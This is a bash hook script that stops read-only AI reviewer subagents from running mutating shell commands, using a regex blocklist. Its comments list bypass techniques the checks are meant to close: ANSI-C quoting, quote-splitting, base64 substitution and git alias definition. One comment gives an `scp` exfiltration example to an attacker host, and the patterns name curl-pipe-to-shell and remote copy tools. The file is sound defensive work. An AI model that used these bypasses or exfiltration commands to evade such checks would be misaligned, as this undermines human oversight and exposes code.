#!/bin/bash
# gemini-sidecar/hooks/validate-reviewer-bash.sh
# @ai-rules:
# 1. [Pattern]: Claude Code subagent-level PreToolUse hook (frontmatter `hooks:` field,
#    NOT the global settings.json hook registered by cli-setup.js). Wired per-subagent
#    in gemini-sidecar/agents/reviewers/*.md frontmatter, matcher "Bash".
# 2. [Constraint]: Read hook JSON from STDIN only (never argv -- avoids ARG_MAX/E2BIG).
#    Exit 2 (with stderr message) blocks the tool call; exit 0 allows it.
# 3. [Contract]: Defense-in-depth blocklist, NOT an exhaustive sandbox. This is layer 3 of 3:
#    (1) reviewer subagents' `tools:` allowlist (no Write/Edit/NotebookEdit), (2) native
#    Claude Code `permissions.deny` rules (--settings code-reviewer-permissions.json,
#    engine-enforced, shell-operator-aware), (3) this hook (custom regex, catches what the
#    denylist can't express, e.g. flag-insertion, indirection, heredoc-interpreter forms).
#    See gemini-sidecar/rules/code_reviewer.md Hard Rules for the documented residual-risk
#    trade-off (bypass risk + false-positive risk, both accepted) and the tracked sandboxing
#    follow-up (OS-level enforcement, gated on an OpenShift SCC/bubblewrap compatibility probe).
# 4. [Contract]: MUST fail CLOSED (exit 2), never fail OPEN (exit 0), on any extraction
#    failure -- missing node, parse error, or timeout. An empty command is only ever
#    "allow" when extraction explicitly succeeded and the command was genuinely empty.
# 5. [Gotcha]: Read-only commands (git diff/log/blame, rg, find, cat) must NOT match any
#    pattern below -- reviewer subagents need these for their actual job.

set -uo pipefail

INPUT=$(cat) || { echo "Blocked: failed to read hook input, failing closed" >&2; exit 2; }

if ! command -v node >/dev/null 2>&1; then
  echo "Blocked: node runtime unavailable, cannot validate command safely, failing closed" >&2
  exit 2
fi

# Input goes to node via STDIN (not argv) so a large command can never hit execve's
# ARG_MAX and silently truncate to empty (the fail-open bypass found in review).
PARSED=$(printf '%s' "$INPUT" | timeout 5 node -e "
  let raw = '';
  process.stdin.on('data', (chunk) => { raw += chunk; });
  process.stdin.on('end', () => {
    try {
      const data = JSON.parse(raw);
      process.stdout.write('OK:' + ((data.tool_input && data.tool_input.command) || ''));
    } catch (e) {
      process.stdout.write('ERR');
    }
  });
" 2>/dev/null)
NODE_STATUS=$?

# Any failure (missing node, non-zero exit, timeout kill, or an ERR sentinel from a
# JSON parse failure) fails CLOSED. Only an explicit "OK:" prefix is treated as a
# successfully-parsed command (which may legitimately be empty).
if [ "$NODE_STATUS" -ne 0 ] || [[ "$PARSED" != OK:* ]]; then
  echo "Blocked: could not parse hook input or validator timed out, failing closed" >&2
  exit 2
fi

COMMAND="${PARSED#OK:}"
[ -z "$COMMAND" ] && exit 0

# Join backslash-newline continuations the way bash itself does when it executes this
# string (deletes both characters, concatenating with no inserted space), then collapse
# any remaining bare newlines (genuine multi-statement commands) into spaces. Without
# this, grep evaluates $COMMAND per-line and `git \` + newline + `commit` slips through
# as two individually-safe-looking lines.
NORMALIZED=$(printf '%s' "$COMMAND" | sed -z 's/\\\n//g' | tr '\n' ' ')

# ANSI-C quoting ($'...') lets bash interpret \xNN/\oNNN escapes into arbitrary literal
# bytes at parse time -- the only standard construct that can produce a command name
# (e.g. "rm") without its literal text ever appearing anywhere in $COMMAND for the
# checks below to see. Legitimate reviewer commands (git/grep/find/rg/cat) never need
# this construct; block it outright rather than trying to decode every escape form.
if printf '%s\n' "$NORMALIZED" | grep -q "\$'"; then
  echo "Blocked: ANSI-C quoting (\$'...') is not permitted -- reviewer subagents are read-only." >&2
  exit 2
fi

# A command that STARTS with a substitution ($(...) or a backtick expression) is
# computing its own command name dynamically. Legitimate read-only commands use
# substitution as an ARGUMENT (e.g. `git log $(cat ref.txt)`), never as the executable
# position. Blocking this position closes the base64-decode-into-$(...) bypass class,
# which -- like ANSI-C quoting above -- contains no literal dangerous token for the
# word-boundary checks below to ever match against.
if printf '%s\n' "$NORMALIZED" | grep -qE '^[[:space:]]*(\$\(|`)'; then
  echo "Blocked: command substitution as the command itself is not permitted." >&2
  exit 2
fi

# Strip quote characters before the main mutation check so quote-splitting (writing a
# dangerous token as e.g. r'm' -- bash concatenates adjacent quoted/unquoted strings
# into one "rm" token at parse time, but the literal bytes "r","'","m","'" never
# contain the contiguous substring "rm" for \b matching to see) can't hide a token.
UNQUOTED=$(printf '%s' "$NORMALIZED" | sed -E "s/[\"']//g")

# Strip the common /dev/null redirect idiom before the mutation check so legitimate
# read-only commands (`grep ... 2>/dev/null`, `git log ... 2>/dev/null`) aren't
# false-positived by the generic `>` pattern below.
CHECK_COMMAND=$(printf '%s' "$UNQUOTED" | sed -E 's#[0-9]?>>?[[:space:]]*/dev/null##g')

# Each alternative below corresponds to a category documented in code_reviewer.md:
# git mutations | filesystem mutations | remote pipe/heredoc execution |
# infra/package mutations | shell-wrapper mutation | interpreter-mediated mutation.
# \b (word boundary) is used instead of anchoring to start-of-string/separator so
# prefixed (`sudo rm`), substituted (`$(rm ...)`, `` `rm ...` ``), and indirected
# (`X=rm; $X`) forms are all caught -- absolute-path invocation still matches too,
# since `\b` fires at the path-separator boundary regardless of what precedes it.
# `((-\S+)(\s+\S+)?\s+)*` between a command and its dangerous subcommand tolerates
# flag insertion, including flags with a separate value argument (`git -C dir commit`,
# `kubectl --context=prod apply`, `sed -e 's/a/b/' -i`), without loosening enough to
# skip over a non-flag token (so `git log -- commit_msg.txt` correctly does NOT match:
# `log`/`--`/the filename never start with `-` immediately after `git`, so the
# alternation is never reached at all -- there is no partial-match path that lands on
# "commit" later). Used everywhere a flag might carry a separate value (FLAG_GAP was
# previously narrower for kubectl/oc/sed -i than for git -- inconsistent, now unified).
GIT_GAP='((-\S+)(\s+\S+)?\s+)*'
# `git config` covers the alias-definition bypass (`git config --local alias.p push`
# followed by `git p ...`): the runtime-resolved alias name is opaque to any static
# check, so the fix is blocking the ability to DEFINE a new alias in the first place.
BLOCK_PATTERN="\\bgit\\s+${GIT_GAP}(commit|push|merge|rebase|reset\\s+.*--hard|checkout\\s+-[bB]|branch\\s+-[dD]|tag\\s|clean\\s+-\\S*f|rm\\b|apply\\b|am\\b|switch\\s+-c|config\\b)"
BLOCK_PATTERN+='|\b(rm|mv|chmod|chown|dd|cp|ln|install|mkdir|touch)\b'
BLOCK_PATTERN+='|\bfind\b.*(-delete\b|-exec\s+(rm|mv|chmod|chown|dd|cp)\b)'
BLOCK_PATTERN+="|sed\\s+${GIT_GAP}-i\\b|>\\s*[^&0-9]|\\btee\\b"
BLOCK_PATTERN+='|(curl|wget).*\|\s*(sh|bash)'
# scp/ssh/rsync/sftp: no legitimate read-only-review need, and unlike curl/wget these
# require no special flag or pipe target to exfiltrate the workspace (plain
# `scp -r . attacker@host:/tmp/` needs no obfuscation at all) -- block outright.
BLOCK_PATTERN+='|\b(scp|ssh|rsync|sftp)\b'
BLOCK_PATTERN+="|\\b(kubectl|oc)\\s+${GIT_GAP}(apply|delete|patch|edit|scale)\\b|\\bnpm\\s+(publish|version)\\b"
BLOCK_PATTERN+='|\b(bash|sh|zsh)\s+(-\S+\s+)*-c\b|\|\s*(bash|sh|zsh)\b'
BLOCK_PATTERN+='|\bpython3?\s+(-\S+\s+)*-c\b|\bnode\s+(-\S+\s+)*(-e|--eval)\b|\bperl\s+(-\S+\s+)*-e\b|\bruby\s+(-\S+\s+)*-e\b|\|\s*(python3?|node|perl|ruby)\b'
BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby)\s*(<<|<[[:space:]])'

if printf '%s\n' "$CHECK_COMMAND" | grep -qiE "$BLOCK_PATTERN"; then
  # Bound + redact the logged command: blocked commands can legitimately contain
  # secrets (e.g. a curl -H "Authorization: Bearer ...") that must not reach pod logs.
  # Covers bearer/basic auth headers, generic key=value secrets, basic-auth-in-URL
  # (https://user:pass@host), and common vendor token prefixes (GitHub ghp_/gho_,
  # GitLab glpat-, AWS AKIA) -- not exhaustive, but closes the specific gaps found
  # in review (colon-delimited custom headers, PAT-prefixed tokens).
  LOG_COMMAND=$(printf '%s' "$COMMAND" \
    | sed -E 's#://[^/@[:space:]]+:[^/@[:space:]]+@#://<redacted>@#g' \
    | sed -E 's/(Bearer|Authorization:|[A-Za-z_-]*(token|password|apikey|api_key|secret)[[:space:]]*[:=])[[:space:]]*[^[:space:]]*/\1 <redacted>/gi' \
    | sed -E 's/\b(ghp_|gho_|ghu_|ghs_|glpat-|AKIA)[A-Za-z0-9_-]+/\1<redacted>/g' \
    | cut -c1-200)
  echo "Blocked: reviewer subagents are read-only. Command matched a mutation pattern: $LOG_COMMAND" >&2
  exit 2
fi

exit 0
